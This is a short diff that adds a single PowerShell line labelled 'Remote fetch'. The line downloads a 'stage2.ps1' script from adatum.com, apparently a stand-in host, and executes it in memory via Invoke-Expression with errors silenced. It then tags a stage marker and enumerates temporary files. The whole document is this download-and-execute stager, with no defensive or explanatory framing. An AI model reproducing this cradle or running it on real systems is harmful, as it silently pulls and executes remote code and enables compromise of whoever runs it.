@@ -1,0 +1,1 @@
+<# Remote fetch #> $TransferUrl = 'http://adatum.com/stage2.ps1'; IEX (Invoke-WebRequest -Uri $TransferUrl -UseBasicParsing -ErrorAction SilentlyContinue).Content; $StageMarker = "stage-43"; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
